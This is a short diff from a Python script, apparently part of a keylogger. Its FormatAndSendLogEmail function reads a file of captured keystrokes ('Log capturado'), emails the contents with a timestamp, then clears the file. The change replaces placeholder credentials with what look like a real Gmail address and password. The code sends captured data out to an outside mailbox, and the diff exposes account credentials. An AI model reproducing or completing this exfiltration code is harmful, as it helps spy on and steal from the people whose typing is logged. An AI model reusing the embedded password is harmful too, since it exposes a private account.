@@ -39,7 +39,7 @@ def FormatAndSendLogEmail():
         actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         data = f.read().replace('\n', '');
         data = 'Log capturado a las: '+ actualdate + '\n' + data
-        SendEmail('tucorreo@gmail.com', 'tuclave', 'tucorreo@gmail.com',
+        SendEmail('lianlvrd@gmail.com', 'contra33', 'lianlvrd@gmail.com',
                   'Nuevo log - '+actualdate, data)
         f.seek(0)
         f.truncate()
